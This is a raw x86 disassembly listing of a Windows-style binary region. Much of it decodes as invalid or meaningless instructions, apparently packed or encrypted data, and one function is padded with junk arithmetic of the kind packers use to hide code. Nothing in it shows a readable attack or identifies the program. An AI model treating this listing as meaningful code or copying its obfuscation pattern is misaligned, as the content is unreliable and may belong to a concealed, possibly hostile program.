  41a20c:	dec    ebx
  41a20d:	test   bl,bl
  41a20f:	stos   DWORD PTR es:[edi],eax
  41a210:	push   esp
  41a211:	nop
  41a212:	scas   eax,DWORD PTR es:[edi]
  41a213:	pop    ss
  41a214:	dec    edi
  41a215:	scas   al,BYTE PTR es:[edi]
  41a216:	inc    edi
  41a217:	jbe    0x41a24f
  41a219:	inc    ebp
  41a21a:	icebp  
  41a21b:	sahf   
  41a21c:	inc    esi
  41a21d:	loope  0x41a1a1
  41a21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a220:	ja     0x41a1f1
  41a222:	pusha  
  41a223:	mov    esp,0xfb210c27
  41a229:	(bad)  
  41a22a:	cmp    ch,BYTE PTR [ebx]
  41a22c:	imul   ecx,DWORD PTR [ebx],0x6a
  41a22f:	jmp    0x768104fe
  41a234:	push   eax
  41a235:	mov    ds:0xe83e88e7,al
  41a23a:	out    dx,al
  41a23b:	mov    ch,ch
  41a23d:	int3   
  41a23e:	sbb    dl,BYTE PTR [edx]
  41a240:	and    al,0x56
  41a243:	dec    ebp
  41a244:	ins    BYTE PTR es:[edi],dx
  41a245:	lds    esp,FWORD PTR [esi]
  41a247:	call   FWORD PTR [eax+eax*4-0x6b045050]
  41a24e:	pop    esi
  41a24f:	jns    0x41a21f
  41a251:	call   0xfac4:0xf07b16d0
  41a258:	xor    BYTE PTR [edi+0xeeb8ce9],0xf9
  41a25f:	imul   ebx,DWORD PTR cs:[ecx],0xffffff8f
  41a263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a264:	mov    BYTE PTR [bx+di],al
  41a267:	int3   
  41a268:	ret    0x3e32
  41a26b:	sti    
  41a26c:	je     0x41a241
  41a26e:	dec    esi
  41a26f:	imul   eax,DWORD PTR [edx+0x4cea8e7c],0xc86ddd8
  41a279:	(bad)  
  41a27a:	retf   0x7543
  41a27d:	inc    ecx
  41a27e:	push   cs
  41a27f:	ret    0xaeec
  41a282:	mov    ds:0xd7d6173b,eax
  41a287:	or     BYTE PTR [edx],0x32
  41a28a:	jmp    0x6763:0xe95d2ebe
  41a291:	add    ecx,DWORD PTR [edx+ecx*4+0x0]
  41a295:	inc    ebx
  41a296:	addr16 xor esi,edx
  41a299:	and    dl,BYTE PTR [ebx+ebp*2-0x46139f23]
  41a2a0:	add    edx,DWORD PTR [edx]
  41a2a2:	cmp    bl,0x8
  41a2a5:	je     0x41a232
  41a2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2a8:	xchg   esp,eax
  41a2a9:	cmc    
  41a2aa:	ret    
  41a2ab:	lea    ebp,[ebp+0x58b46bf7]
  41a2b1:	mov    ch,0x81
  41a2b3:	mov    DWORD PTR [edx-0x8ecc323],0xcef7ce8b
  41a2bd:	mov    edi,0xa4f78c02
  41a2c2:	jle    0x41a259
  41a2c4:	jle    0x41a2de
  41a2c6:	cmp    eax,0xc78d127e
  41a2cb:	xchg   ecx,eax
  41a2cc:	mov    BYTE PTR [ebp-0x38],al
  41a2cf:	push   eax
  41a2d0:	(bad)  
  41a2d2:	popf   
  41a2d3:	out    dx,al
  41a2d4:	gs int 0xb
  41a2d7:	jbe    0x41a2f4
  41a2d9:	jbe    0x41a2d3
  41a2db:	inc    edi
  41a2dc:	mov    ah,dh
  41a2de:	pop    ecx
  41a2df:	mov    bh,0xaf
  41a2e1:	jns    0x41a2e6
  41a2e3:	call   0xcee83b70
  41a2e8:	inc    ecx
  41a2e9:	jne    0x41a356
  41a2eb:	test   DWORD PTR [esi-0x3c705f50],0x2d49f359
  41a2f5:	lods   al,BYTE PTR ds:[esi]
  41a2f6:	hlt    
  41a2f7:	mov    dl,0x6c
  41a2f9:	pop    edx
  41a2fa:	pop    esi
  41a2fb:	or     edx,edi
  41a2fd:	shr    BYTE PTR [ebx+0x20],0xe9
  41a301:	jae    0x41a2e9
  41a303:	addr16 imul eax,edx,0xffffffbb
  41a307:	pop    edi
  41a308:	hlt    
  41a309:	push   0x5a
  41a30b:	adc    DWORD PTR [edx+0x56751e9d],edi
  41a311:	imul   ebp,DWORD PTR [edx],0x16
  41a314:	psrld  mm3,QWORD PTR [ebx+0x7e]
  41a318:	fldcw  WORD PTR [edx+0x36]
  41a31b:	imul   ebp,edx,0x31
  41a31e:	lods   al,BYTE PTR ds:[esi]
  41a31f:	dec    edx
  41a320:	test   DWORD PTR [esi],edx
  41a322:	rcr    BYTE PTR [ebp-0x5a],1
  41a325:	adc    al,BYTE PTR [esi+ebp*2+0x0]
  41a329:	es cdq 
  41a32b:	jb     0x41a3a2
  41a32d:	leave  
  41a32e:	xchg   esp,eax
  41a32f:	jp     0x41a379
  41a331:	sbb    al,0x19
  41a334:	nop
  41a335:	mov    ah,0x3d
  41a337:	inc    ebp
  41a338:	xchg   BYTE PTR [edx-0x7a045c9d],dh
  41a33e:	repz and edx,ebx
  41a341:	mov    ebx,0x31bceb69
  41a346:	mov    ecx,ebx
  41a348:	(bad)  
  41a349:	and    esp,esi
  41a34b:	loopne 0x41a3ba
  41a34d:	ins    BYTE PTR es:[edi],dx
  41a34e:	mov    BYTE PTR [edi],al
  41a350:	push   fs
  41a352:	cwde   
  41a353:	xchg   ecx,eax
  41a354:	leave  
  41a355:	(bad)  
  41a356:	adc    DWORD PTR [ecx],edx
  41a358:	or     cl,ch
  41a35a:	mov    DWORD PTR [ebx-0x26d50d04],edx
  41a360:	jno    0x41a2e7
  41a362:	gs loope 0x41a2eb
  41a365:	mov    ds:0xb45bcce2,eax
  41a36a:	imul   esi,DWORD PTR [ebp+0x14],0xac4ce5c6
  41a371:	and    al,0x52
  41a373:	imul   ecx,esp,0x6b
  41a376:	xchg   esp,eax
  41a377:	lock or al,0xd9
  41a37a:	(bad)  
  41a37b:	adc    BYTE PTR [esi+0x7b],dh
  41a37e:	dec    esi
  41a37f:	mov    dl,0xc7
  41a381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a382:	pop    ebp
  41a383:	xor    ebp,DWORD PTR [ebx+0x55]
  41a386:	dec    edx
  41a387:	mov    esp,0x63424509
  41a38c:	aad    0xb6
  41a38e:	ds dec edx
  41a390:	sahf   
  41a391:	inc    ecx
  41a392:	jno    0x41a394
  41a394:	leave  
  41a395:	sbb    eax,0xc8c0e67c
  41a39a:	ss cwde 
  41a39c:	dec    ebp
  41a39d:	dec    edi
  41a39e:	pop    ds
  41a39f:	sbb    eax,0x28dfd34f
  41a3a4:	adc    DWORD PTR [ebx],0xeafa2e18
  41a3aa:	in     al,0xb
  41a3ac:	lods   al,BYTE PTR ds:[esi]
  41a3ad:	mov    cl,0x51
  41a3af:	and    ebx,DWORD PTR [ebp-0x7eddc2f7]
  41a3b5:	lds    esi,FWORD PTR [eax+eiz*8]
  41a3b8:	js     0x41a35a
  41a3ba:	ret    0xf283
  41a3bd:	in     eax,dx
  41a3be:	mov    edi,0x959e6d2c
  41a3c3:	das    
  41a3c4:	inc    edx
  41a3c5:	inc    esi
  41a3c6:	jmp    0xd79825a3
  41a3cb:	or     ah,BYTE PTR [ebp-0x4c4c747b]
  41a3d1:	mov    al,0x23
  41a3d3:	mov    bl,BYTE PTR [eax+0x4e0cf437]
  41a3d9:	out    dx,eax
  41a3da:	shl    DWORD PTR [ebx+ebp*1-0x8f4ccc3],cl
  41a3e1:	xchg   edx,eax
  41a3e2:	and    BYTE PTR [ebx],al
  41a3e4:	add    eax,0x4ab5acab
  41a3e9:	pop    esp
  41a3ea:	jo     0x41a3ca
  41a3ec:	loope  0x41a44b
  41a3ee:	in     eax,dx
  41a3ef:	jmp    0x41a3a5
  41a3f1:	inc    sp
  41a3f3:	popa   
  41a3f4:	fsubrp st(1),st
  41a3f6:	add    edi,edi
  41a3f8:	mov    bh,0xc1
  41a3fa:	push   eax
  41a3fb:	xor    ebx,ecx
  41a3fd:	shl    DWORD PTR [edx+edx*1-0x6b6619da],0xf8
  41a405:	repnz (bad) 
  41a407:	mul    dl
  41a409:	loope  0x41a3c4
  41a40b:	pop    ecx
  41a40c:	sbb    eax,0xac8c186e
  41a411:	mov    esi,0xcfab069c
  41a416:	pop    ebp
  41a417:	push   0xffffffd4
  41a419:	mov    cl,0xee
  41a41b:	or     eax,0x72eb8a42
  41a420:	inc    esp
  41a421:	add    dl,BYTE PTR [ecx]
  41a423:	popf   
  41a424:	pop    eax
  41a425:	dec    edi
  41a426:	int    0x2b
  41a428:	pusha  
  41a429:	jb     0x41a404
  41a42b:	std    
  41a42c:	test   eax,0x41107ef7
  41a431:	xchg   edi,eax
  41a432:	sbb    BYTE PTR [ebp-0x2a76dd4f],cl
  41a438:	es scas al,BYTE PTR es:[edi]
  41a43a:	imul   esi,DWORD PTR [esi+0x30],0x65ec38e5
  41a441:	loop   0x41a3e3
  41a443:	push   es
  41a444:	pop    edx
  41a445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a446:	xor    al,0xa7
  41a448:	mov    bh,0x2f
  41a44a:	out    0x54,eax
  41a44c:	lds    esp,FWORD PTR [esi]
  41a44e:	repnz sbb DWORD PTR [eax+0x3a],ebx
  41a452:	jecxz  0x41a43e
  41a454:	addr16 cmp al,0xfd
  41a457:	stos   DWORD PTR es:[edi],eax
  41a458:	fcomi  st,st(6)
  41a45a:	add    edx,edi
  41a45c:	xchg   edi,eax
  41a45d:	test   DWORD PTR [ebp+0x9ab9935],ecx
  41a463:	cld    
  41a464:	push   es
  41a465:	pop    es
  41a466:	cmc    
  41a467:	icebp  
  41a468:	scas   eax,DWORD PTR es:[edi]
  41a469:	test   al,dl
  41a46b:	fadd   QWORD PTR [edx+0x4d29fe9a]
  41a471:	test   esi,esi
  41a473:	fmul   st,st(5)
  41a475:	mov    dl,0xb5
  41a477:	cmp    al,0xa0
  41a479:	adc    eax,0x11ed8be1
  41a47e:	sub    eax,0xb497e934
  41a483:	cmp    al,cl
  41a485:	mov    BYTE PTR [edx+0x34a4cb6],bl
  41a48b:	push   cs
  41a48c:	xor    BYTE PTR [ebx+0x31],dl
  41a48f:	cld    
  41a490:	aam    0xf7
  41a492:	or     dl,BYTE PTR [ecx]
  41a494:	or     ch,bl
  41a496:	xchg   ebp,eax
  41a497:	daa    
  41a498:	popf   
  41a499:	outs   dx,BYTE PTR ds:[esi]
  41a49a:	sub    eax,0xf7381ef1
  41a49f:	sahf   
  41a4a0:	jmp    0xdd85:0x1b76a0bc
  41a4a7:	sbb    eax,0x64268d91
  41a4ac:	cld    
  41a4ad:	push   cs
  41a4ae:	retf   0x3fd6
  41a4b1:	sbb    BYTE PTR [ecx-0x5],dh
  41a4b4:	cmp    al,0xc
  41a4b6:	inc    ebp
  41a4b7:	lahf   
  41a4b8:	jmp    0x607:0x89ebb46d
  41a4bf:	jl     0x41a459
  41a4c1:	fcmove st,st(3)
  41a4c3:	pop    edx
  41a4c4:	rol    cl,0x4e
  41a4c7:	fdiv   DWORD PTR [ebx-0x730c66f]
  41a4cd:	add    BYTE PTR [ebp-0x415d02d],0x85
  41a4d4:	stc    
  41a4d5:	mov    bl,0x4b
  41a4d7:	fst    DWORD PTR [eax-0x49]
  41a4da:	imul   al
  41a4dc:	push   0x6e
  41a4de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4df:	js     0x41a49d
  41a4e1:	mov    dl,BYTE PTR [edi+0x25b732da]
  41a4e7:	ud1    eax,DWORD PTR [ebx]
  41a4ea:	inc    esi
  41a4eb:	call   FWORD PTR [esi]
  41a4ed:	mov    bh,0x4e
  41a4ef:	mov    ecx,0xd5826b03
  41a4f4:	adc    eax,0x71ac45af
  41a4f9:	jmp    0x1082:0xbbbfb9bf
  41a500:	mov    dh,BYTE PTR [edx]
  41a502:	xor    eax,0xbf581978
  41a507:	inc    ebx
  41a508:	inc    esp
  41a509:	dec    edi
  41a50a:	cmp    BYTE PTR [edx+eax*1+0x29ce6bfc],dh
  41a511:	adc    DWORD PTR [ebp+0x5d],esp
  41a514:	inc    ebx
  41a515:	add    BYTE PTR [eax],cl
  41a517:	aas    
  41a518:	out    dx,eax
  41a519:	clc    
  41a51a:	test   BYTE PTR [eax-0x26],ah
  41a51d:	and    ebp,DWORD PTR [edi-0xb]
  41a520:	ins    BYTE PTR es:[edi],dx
  41a521:	and    eax,edi
  41a523:	xor    DWORD PTR [eax+0x4be9f19b],edi
  41a529:	in     al,dx
  41a52a:	stos   BYTE PTR es:[edi],al
  41a52b:	adc    al,0x63
  41a52d:	cli    
  41a52e:	icebp  
  41a52f:	das    
  41a530:	push   ebx
  41a531:	add    BYTE PTR ds:0x9d87e0cf,0xd8
  41a538:	push   0xffffffe9
  41a53a:	jmp    0x2e536df0
  41a53f:	push   esp
  41a540:	retf   
  41a541:	in     al,dx
  41a542:	js     0x41a50f
  41a544:	push   0x3a02bed5
  41a549:	inc    BYTE PTR [esi+ebp*4+0x2417bb7]
  41a550:	jl     0x41a4dd
  41a552:	sbb    ecx,ecx
  41a554:	out    0xcc,eax
  41a556:	push   ss
  41a557:	icebp  
  41a558:	mov    ebx,0x2c5c2b5e
  41a55d:	sti    
  41a55e:	xor    BYTE PTR [edi+0x472b30c0],0xa9
  41a565:	clc    
  41a566:	inc    eax
  41a567:	mov    bh,0x25
  41a569:	or     eax,0x6237332a
  41a56e:	mov    bl,0x1e
  41a570:	fwait
  41a571:	aas    
  41a572:	jns    0x41a51d
  41a574:	mul    DWORD PTR [edi]
  41a576:	cwde   
  41a577:	jecxz  0x41a58b
  41a579:	(bad)  
  41a57a:	cmp    bl,BYTE PTR [eax-0x53]
  41a57d:	pop    es
  41a57e:	fsub   QWORD PTR [edx-0x61af62ae]
  41a584:	jns    0x41a522
  41a586:	cmp    BYTE PTR [esi],cl
  41a588:	lods   al,BYTE PTR ds:[esi]
  41a589:	xchg   ch,bl
  41a58b:	sub    al,0x5d
  41a58d:	jge    0x41a5e6
  41a58f:	cdq    
  41a590:	cmp    BYTE PTR [esi-0x5d],0x0
  41a594:	push   cs
  41a595:	xchg   ebp,eax
  41a596:	icebp  
  41a597:	fidiv  DWORD PTR [esi-0x54556cb2]
  41a59d:	mov    edx,0x2d310b0c
  41a5a2:	lds    ebp,FWORD PTR [eax+ebp*8-0x307d906a]
  41a5a9:	retf   
  41a5aa:	in     eax,0x35
  41a5ac:	sbb    al,0x24
  41a5ae:	dec    ebx
  41a5af:	pop    eax
  41a5b0:	loop   0x41a5a3
  41a5b2:	sbb    al,0x87
  41a5b4:	mov    dh,0xcb
  41a5b6:	mov    eax,0x72a71061
  41a5bb:	add    edx,eax
  41a5bd:	clc    
  41a5be:	xchg   edx,eax
  41a5bf:	jge    0x41a624
  41a5c1:	xor    al,BYTE PTR [edx-0xf]
  41a5c4:	push   edx
  41a5c5:	nop
  41a5c6:	adc    bh,ah
  41a5c8:	inc    ecx
  41a5c9:	xchg   ebx,eax
  41a5ca:	mov    al,ds:0x1ab87b18
  41a5cf:	loopne 0x41a580
  41a5d1:	push   0x50
  41a5d3:	sub    bh,BYTE PTR [edx]
  41a5d5:	(bad)
  41a5d8:	mov    ds:0x7b59d90c,al
  41a5dd:	div    DWORD PTR ds:0xcdcc8f05
  41a5e3:	mov    bh,0xe8
  41a5e5:	jae    0x41a5d4
  41a5e7:	imul   ebx,edi,0xffffffd4
  41a5ea:	push   0xffffffb5
  41a5ec:	xchg   ecx,eax
  41a5ed:	inc    edi
  41a5ee:	and    DWORD PTR [ebx-0x21],ebx
  41a5f1:	push   ebx
  41a5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5f3:	cmp    DWORD PTR [ebp-0x25],esi
  41a5f6:	adc    ah,0xb4
  41a5f9:	xor    dl,dh
  41a5fb:	lock xchg edi,eax
  41a5fd:	das    
  41a5fe:	dec    esi
  41a5ff:	stos   DWORD PTR es:[edi],eax
  41a600:	ret    
  41a601:	dec    eax
  41a602:	cli    
  41a603:	inc    eax
  41a604:	pop    esp
  41a605:	paddw  mm2,QWORD PTR [ebp+esi*1-0x6b]
  41a60a:	or     esp,DWORD PTR [esi]
  41a60c:	mov    edi,0xa5c692ad
  41a611:	test   al,0xc4
  41a613:	inc    ebp
  41a614:	jmp    FWORD PTR [ecx-0x57931632]
  41a61a:	mov    ebx,0xa3035a08
  41a61f:	sub    eax,0x93c7d26
  41a624:	dec    edi
  41a625:	xlat   BYTE PTR ds:[ebx]
  41a626:	jb     0x41a5fe
  41a628:	push   0x57
  41a62a:	dec    esi
  41a62b:	aad    0x48
  41a62d:	rol    edx,cl
  41a62f:	ja     0x41a65f
  41a631:	cs inc edx
  41a633:	nop
  41a634:	mov    dl,0xd3
  41a636:	(bad)  
  41a639:	mov    edi,0x75906210
  41a63e:	cmp    al,0x7a
  41a640:	dec    ebx
  41a641:	pop    ebx
  41a642:	sub    edi,esi
  41a644:	push   esp
  41a645:	pop    ds
  41a646:	pop    eax
  41a647:	leave  
  41a648:	sar    ch,cl
  41a64a:	loope  0x41a5ee
  41a64c:	push   cs
  41a64d:	loope  0x41a618
  41a64f:	retf   0x3f54
  41a652:	ins    BYTE PTR es:[edi],dx
  41a653:	jp     0x41a651
  41a655:	outs   dx,BYTE PTR ds:[esi]
  41a656:	bound  eax,QWORD PTR [ecx+0x3d]
  41a659:	adc    BYTE PTR [ebx],ch
  41a65b:	cld    
  41a65c:	out    0x1,al
  41a65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a65f:	or     ebp,eax
  41a661:	cli    
  41a662:	xor    BYTE PTR [ecx+edi*8+0x50f24ab9],0x34
  41a66a:	or     al,0xdd
  41a66c:	nop
  41a66d:	popf   
  41a66e:	cmp    al,0xa2
  41a670:	jle    0x41a698
  41a672:	repz shl DWORD PTR [ebx+eax*4+0x6647ae0e],1
  41a67a:	xchg   ecx,eax
  41a67b:	mov    al,0x7a
  41a67d:	pop    edx
  41a67e:	in     al,dx
  41a67f:	mov    BYTE PTR [ecx+0x6e51d92e],0x53
  41a686:	mov    ch,0xa7
  41a688:	mov    ds:0x6e5920a7,al
  41a68d:	push   ebp
  41a68e:	in     al,dx
  41a68f:	sbb    BYTE PTR [edx],dh
  41a691:	in     al,0x5d
  41a693:	mov    eax,ds:0xdc3785e
  41a698:	fild   QWORD PTR [esi+0x39]
  41a69b:	rol    dl,1
  41a69d:	stc    
  41a69e:	gs pop ebp
  41a6a0:	rol    DWORD PTR [esi],1
  41a6a2:	nop
  41a6a3:	adc    esp,ecx
  41a6a5:	popf   
  41a6a6:	pop    es
  41a6a7:	push   0x8253e035
  41a6ac:	stos   DWORD PTR es:[edi],eax
  41a6ad:	add    DWORD PTR [edi-0x20d00695],0xc2523a04
  41a6b7:	or     edi,DWORD PTR [edx+0x437087dd]
  41a6bd:	xor    ah,BYTE PTR [edx]
  41a6bf:	test   BYTE PTR [edx+ecx*4],cl
  41a6c2:	dec    edx
  41a6c3:	loop   0x41a73c
  41a6c5:	xchg   edx,eax
  41a6c6:	mov    ecx,DWORD PTR ds:0xd93cc64f
  41a6cc:	jne    0x41a663
  41a6ce:	sub    BYTE PTR [edx],ah
  41a6d0:	jp     0x41a707
  41a6d2:	aad    0xfe
  41a6d4:	pop    ecx
  41a6d5:	sar    bh,0xa8
  41a6d8:	add    eax,0x3d563e8a
  41a6dd:	arpl   WORD PTR ds:0xd3e25848,cx
  41a6e3:	mov    DWORD PTR [edx],esi
  41a6e5:	std    
  41a6e6:	data16 mov dh,0x9b
  41a6e9:	sbb    esi,esi
  41a6eb:	push   ds
  41a6ec:	ror    edx,1
  41a6ee:	xor    al,0xde
  41a6f0:	dec    ebp
  41a6f1:	jp     0x41a6e9
  41a6f3:	pushf  
  41a6f4:	call   0xc9d9e33c
  41a6f9:	push   ss
  41a6fa:	imul   eax,DWORD PTR [ebx-0x753c4281],0x70
  41a701:	stc    
  41a702:	call   0x992c627b
  41a707:	pop    eax
  41a708:	xor    edx,edx
  41a70a:	and    cl,0x1f
  41a70d:	shr    eax,cl
  41a70f:	ret    
  41a710:	xor    eax,eax
  41a712:	xor    edx,edx
  41a714:	ret    
  41a715:	push   ebp
  41a716:	mov    ebp,esp
  41a718:	sub    esp,0x40
  41a71b:	sub    ecx,ecx
  41a71d:	mov    DWORD PTR [ebp-0x18],0xba699573
  41a724:	xor    eax,ecx
  41a726:	mov    eax,0x9c0a89d8
  41a72b:	mov    edx,DWORD PTR ds:0x422976
  41a731:	sbb    DWORD PTR ds:0x42291a,edx
  41a737:	mov    DWORD PTR [ebp-0x14],eax
  41a73a:	mov    DWORD PTR [ebp-0x40],0xba699577
  41a741:	sub    edx,0x26e4
  41a747:	mov    DWORD PTR [ebp-0x3c],eax
  41a74a:	sbb    DWORD PTR ds:0x4228ba,edx
  41a750:	mov    DWORD PTR [ebp-0x28],0x644f
  41a757:	cmp    DWORD PTR ds:0x4228ae,0x0
  41a75e:	mov    ecx,DWORD PTR ds:0x4228fa
  41a764:	mov    DWORD PTR ds:0x42288a,edx
  41a76a:	mov    edx,DWORD PTR ds:0x42299e
  41a770:	jmp    0x41a7c9
  41a775:	mov    DWORD PTR ds:0x4229ce,ecx
  41a77b:	jbe    0x41a7ad
  41a781:	push   DWORD PTR [ebp-0x20]
  41a784:	call   DWORD PTR ds:0x42a028
  41a78a:	sub    DWORD PTR ds:0x42290a,0x27cb
  41a794:	movzx  ecx,BYTE PTR ds:0x422966
  41a79b:	and    ecx,DWORD PTR ds:0x4229d2
  41a7a1:	mov    DWORD PTR ds:0x422966,ecx
  41a7a7:	add    DWORD PTR ds:0x422972,edx
  41a7ad:	or     DWORD PTR ds:0x42296a,0x5f39
  41a7b7:	sbb    DWORD PTR ds:0x4229b6,edx
  41a7bd:	sbb    DWORD PTR ds:0x422932,edx
  41a7c3:	sub    edx,DWORD PTR ds:0x4228c2
  41a7c9:	mov    DWORD PTR [ebp-0x24],0x68c8
  41a7d0:	xor    eax,edx
  41a7d2:	mov    DWORD PTR [ebp-0x20],0x436a
  41a7d9:	cmp    DWORD PTR ds:0x4228aa,0x0
  41a7e0:	mov    edx,0x68cf
  41a7e5:	mov    DWORD PTR ds:0x422922,ebx
  41a7eb:	mov    edx,DWORD PTR ds:0x422936
  41a7f1:	jmp    0x41a823
  41a7f6:	mov    eax,ds:0x42292a
  41a7fb:	jne    0x41a818
  41a801:	push   0x4229b6
  41a806:	call   DWORD PTR ds:0x42a054
  41a80c:	adc    DWORD PTR ds:0x4229ba,ecx
  41a812:	sub    edx,DWORD PTR ds:0x4228aa
  41a818:	xor    DWORD PTR ds:0x4229ce,0x5de2
  41a822:	dec    ecx
  41a823:	mov    DWORD PTR [ebp-0x1c],0x58c6
  41a82a:	mov    DWORD PTR [ebp-0x10],0x7919
  41a831:	mov    DWORD PTR [ebp-0xc],0x6efc
  41a838:	mov    eax,DWORD PTR [ebp-0x10]
  41a83b:	sub    DWORD PTR ds:0x4228da,0x3418
  41a845:	mov    ecx,DWORD PTR [ebp-0xc]
  41a848:	jmp    0x41ac91
  41a84d:	mov    ?,WORD PTR [edx-0x20]
  41a850:	dec    ebx
  41a851:	fdiv   DWORD PTR [ecx]
  41a853:	adc    al,0x32
  41a855:	std    
  41a856:	cs aam 0xa8
  41a859:	rcr    DWORD PTR ss:[eax+0xc2f1cb2],1
  41a860:	push   ss
  41a861:	(bad)  
  41a862:	push   cs
  41a863:	push   ss
  41a864:	push   ss
  41a865:	pop    ecx
  41a866:	in     al,dx
  41a867:	fcmovnu st,st(5)
  41a869:	sub    DWORD PTR [ecx+0x32418c32],ebp
  41a86f:	loope  0x41a8b8
  41a871:	inc    edi
  41a872:	jmp    0x6fd8f284
  41a877:	push   esp
  41a878:	test   DWORD PTR [edi],0x2d4c5544
  41a87e:	cmp    bh,al
  41a880:	fnstenv [eax-0x25]
  41a883:	xchg   ebx,eax
  41a884:	xor    ch,BYTE PTR [edx+0x6]
  41a887:	pop    es
  41a888:	pop    edi
  41a889:	dec    ebx
  41a88a:	sub    al,0xb9
  41a88c:	sub    esi,DWORD PTR [ecx]
  41a88e:	repnz pushf 
  41a890:	sar    DWORD PTR [ebx],1
  41a892:	and    eax,0xeab37784
  41a897:	in     al,dx
  41a898:	push   ecx
  41a899:	aas    
  41a89a:	cmc    
  41a89b:	and    ebp,ebx
  41a89d:	imul   eax,DWORD PTR [ebx+eiz*4-0x13],0x1d5851db
  41a8a5:	cli    
  41a8a6:	fisub  WORD PTR [edi+0x5b]
  41a8a9:	mov    bl,0x63
  41a8ab:	mov    WORD PTR [eax],ds
  41a8ad:	fsub   DWORD PTR [edi]
  41a8af:	sub    al,0x99
  41a8b1:	pop    edx
  41a8b3:	push   ebp
  41a8b4:	jle    0x41a857
  41a8b6:	(bad)  
  41a8b7:	sbb    al,0xc
  41a8b9:	popf   
  41a8ba:	je     0x41a919
  41a8bc:	push   eax
  41a8bd:	scas   al,BYTE PTR es:[edi]
  41a8be:	les    esp,FWORD PTR [ebx+edx*1-0x1c]
  41a8c2:	jl     0x41a905
  41a8c4:	hlt    
  41a8c5:	push   ss
  41a8c6:	xchg   esi,eax
  41a8c7:	pop    edx
  41a8c8:	xor    edx,DWORD PTR [edx-0x644eb0d6]
  41a8ce:	aam    0xb8
  41a8d0:	cld    
  41a8d1:	sub    BYTE PTR [esi-0x6554cbbd],ch
  41a8d7:	(bad)  
  41a8d8:	lods   eax,DWORD PTR ds:[esi]
  41a8d9:	loopne 0x41a8e0
  41a8db:	rcl    BYTE PTR [ecx+0x43e6d9b4],1
  41a8e1:	dec    esp
  41a8e2:	mov    al,0x1a
  41a8e4:	iret   
  41a8e5:	daa    
  41a8e6:	(bad)  
  41a8e7:	aad    0xf4
  41a8e9:	dec    ebx
  41a8ea:	or     bh,bh
  41a8ec:	dec    edi
  41a8ed:	jae    0x41a908
  41a8ef:	(bad)  
  41a8f0:	pop    ebp
  41a8f1:	pop    edi
  41a8f2:	mov    ebp,0xe284be4c
  41a8f7:	gs arpl cx,dx
  41a8fa:	dec    esp
  41a8fb:	dec    ebp
  41a8fc:	mov    edi,0x9e96a101
  41a901:	js     0x41a8a2
  41a903:	scas   al,BYTE PTR es:[edi]
  41a904:	stos   DWORD PTR es:[edi],eax
  41a905:	pop    eax
  41a906:	das    
  41a907:	pusha  
  41a908:	sbb    edx,ebx
  41a90a:	psrlw  mm2,QWORD PTR [ebx+0x62]
  41a90e:	clc    
  41a90f:	mov    ah,0x10
  41a911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a912:	xchg   esi,eax
  41a913:	sbb    al,0xce
  41a915:	mov    ecx,0x243dae47
  41a91a:	dec    ebp
  41a91b:	mov    bl,0x35
  41a91d:	mov    ebx,0xa35dfbd
  41a922:	fbld   TBYTE PTR ds:0xf02f035d
  41a928:	jnp    0x41a97e
  41a92a:	or     eax,0x8b3d5167
  41a92f:	les    ebx,FWORD PTR ds:0xd397173b
  41a935:	cmp    al,0xd2
  41a937:	fcomi  st,st(7)
  41a939:	cs sbb dl,bh
  41a93c:	in     al,dx
  41a93d:	xchg   edi,eax
  41a93e:	dec    eax
  41a93f:	rol    DWORD PTR [ecx+ecx*2],1
  41a942:	enter  0x18ed,0xea
  41a946:	push   esi
  41a947:	fidiv  DWORD PTR [esi+ebp*4-0x7e]
  41a94b:	push   esp
  41a94c:	mov    al,0x49
  41a94e:	pop    ecx
  41a94f:	xor    bl,BYTE PTR [edx-0x3a2613f9]
  41a955:	inc    ebp
  41a956:	addr16 xor eax,0xacc99a76
  41a95c:	test   DWORD PTR [esi],eax
  41a95e:	aam    0x30
  41a960:	sbb    eax,0xe3d0fba6
  41a965:	aas    
  41a966:	jnp    0x41a9c2
  41a968:	xchg   esp,eax
  41a969:	je     0x41a958
  41a96b:	inc    edi
  41a96c:	in     eax,dx
  41a96d:	dec    esp
  41a96e:	push   ss
  41a96f:	mov    eax,0x145f0b7e
  41a974:	jecxz  0x41a962
  41a976:	lahf   
  41a977:	mov    ch,0x45
  41a979:	dec    eax
  41a97a:	sbb    al,0x65
  41a97c:	mov    eax,ds:0x1f7e6414
  41a981:	dec    esi
  41a982:	fstp   QWORD PTR [ecx]
  41a984:	lods   eax,DWORD PTR ds:[esi]
  41a985:	push   edi
  41a986:	jle    0x41a98e
  41a988:	push   ss
  41a989:	leave  
  41a98a:	in     al,0x15
  41a98c:	mov    ds:0xeeec44b3,eax
  41a991:	mov    edx,0xe6a57b36
  41a996:	icebp  
  41a997:	ins    BYTE PTR es:[edi],dx
  41a998:	dec    BYTE PTR [ebx+0x2e0c1233]
  41a99e:	dec    esi
  41a99f:	inc    ebx
  41a9a0:	sbb    cl,BYTE PTR [ebx]
  41a9a2:	push   eax
  41a9a3:	rcr    DWORD PTR [ebp+eax*8-0x3888efb7],0x34
  41a9ab:	adc    BYTE PTR [ebp-0x51],0x4b
  41a9af:	nop
  41a9b0:	test   al,0xb0
  41a9b2:	data16 fdivrp st(1),st
  41a9b5:	inc    BYTE PTR [edi-0x63fe19a4]
  41a9bb:	nop
  41a9bc:	jb     0x41a9e5
  41a9be:	mov    esp,0x292572b4
  41a9c3:	stos   BYTE PTR es:[edi],al
  41a9c4:	xchg   DWORD PTR [ebx+0x4c],edx
  41a9c7:	imul   esi,DWORD PTR ds:0x1d147786,0xffffff9c
  41a9ce:	pop    esp
  41a9cf:	js     0x41a9ef
  41a9d1:	xor    DWORD PTR [ebp-0x28932b4c],ecx
  41a9d7:	mov    ebp,0xf5dbff54
  41a9dc:	push   ebx
  41a9dd:	outs   dx,DWORD PTR ds:[esi]
  41a9de:	retf   
  41a9df:	test   eax,0xd8010054
  41a9e4:	push   cs
  41a9e5:	jmp    0x41a97c
  41a9e7:	inc    ebp
  41a9e8:	std    
  41a9e9:	or     DWORD PTR [ebx+0x6d2d0061],0x17bfc264
